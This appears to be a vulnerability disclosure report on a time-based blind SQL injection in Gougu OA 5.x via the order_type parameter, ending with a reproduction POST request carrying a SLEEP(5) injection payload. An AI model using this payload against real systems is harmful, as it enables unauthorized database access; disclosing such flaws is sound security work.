# -Security-Report-Time-based-Blind-SQL-Injection-in-customer-customer-datalist.html



### Vulnerability Description
Gougu OA (勾股OA) contains a Time-based Blind SQL Injection vulnerability.

**Affected Page**: `/customer/customer/datalist.html`

**Vulnerable Parameter**: `order_type`

**Vulnerability Type**: SQL Injection (CWE-89)

**Affected Versions**: All 5.x versions (including the latest version)

### Reproduction Steps
1. After logging into the system, send the following POST request:

```http
POST /customer/customer/datalist.html HTTP/1.1
Host: your-target-ip:8080
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=your-session-id
Content-Type: application/x-www-form-urlencoded

order_field=id&order_type=,(SELECT SLEEP(5))&page=1&limit=5
